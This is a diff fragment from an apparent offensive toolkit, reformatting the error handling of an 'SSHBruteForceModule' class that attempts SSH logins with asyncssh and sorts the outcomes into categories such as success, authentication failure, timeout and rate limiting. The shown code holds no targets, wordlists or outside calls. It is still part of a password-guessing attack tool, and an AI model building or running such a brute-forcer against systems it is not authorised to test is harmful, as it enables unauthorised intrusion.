@@ -878,98 +866,31 @@ class SSHBruteForceModule(BaseAttackModule):
                         "ssh-rsa",
                     ],
                 ),
-
-                timeout=15
+                timeout=15,
             )
-
             conn.close()
-
             return "success"
 
-        # =====================================================
-        # AUTH FAIL
-        # =====================================================
-
         except asyncssh.PermissionDenied:
-
             return "auth_failed"
-
-        # =====================================================
-        # CONNECTION RESET
-        # =====================================================
-
         except ConnectionResetError:
-
             return "reset"
-
-        # =====================================================
-        # SSH NEGOTIATION RESET
-        # =====================================================
-
         except asyncssh.ConnectionLost:
-
             return "reset"
-
-        # =====================================================
-        # TIMEOUT
-        # =====================================================
-
         except asyncio.TimeoutError:
-
             return "timeout"
-
-        # =====================================================
-        # REFUSED
-        # =====================================================
-
         except ConnectionRefusedError:
-
             return "refused"
-
-        # =====================================================
-        # KEX FAILURE
-        # =====================================================
-
         except asyncssh.KeyExchangeFailed:
-
             return "kex_failed"
-
-        # =====================================================
-        # HOSTKEY FAILURE
-        # =====================================================
-
         except asyncssh.HostKeyNotVerifiable:
-
             return "hostkey_failed"
-
-        # =====================================================
-        # DISCONNECT
-        # =====================================================
-
         except asyncssh.DisconnectError:
-
             return "disconnect"
-
-        # =====================================================
-        # GENERIC
-        # =====================================================
-
         except Exception as e:
-
-            error_text = str(e).lower()
-
-            if "reset by peer" in error_text:
-
-                return "reset"
-
-            if "connection lost" in error_text:
-
-                return "reset"
-
-            if "too many connections" in error_text:
-
-                return "rate_limited"
-
+            err = str(e).lower()
+            if "reset by peer"       in err: return "reset"
+            if "connection lost"     in err: return "reset"
+            if "too many connections" in err: return "rate_limited"
             print(f"[ERROR] {e}")
-
             return "other"
